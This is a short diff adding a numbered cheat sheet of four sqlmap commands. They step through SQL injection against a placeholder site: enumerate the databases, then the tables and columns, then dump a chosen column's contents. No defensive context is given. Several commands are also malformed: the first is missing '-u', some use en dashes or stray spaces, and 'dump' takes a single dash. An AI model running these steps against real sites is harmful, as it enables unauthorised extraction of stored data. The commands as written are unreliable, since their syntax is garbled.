@@ -1,0 +1,6 @@
+1) sqlmap sitename -- dbs
+2) sqlmap -u sitename -D dbname –tables
+3) sqlmap -u sitename -D dbname –columns.
+4) sqlmap -u sitename -D dbname -T tablename -C columnname -dump
+ 
+ 
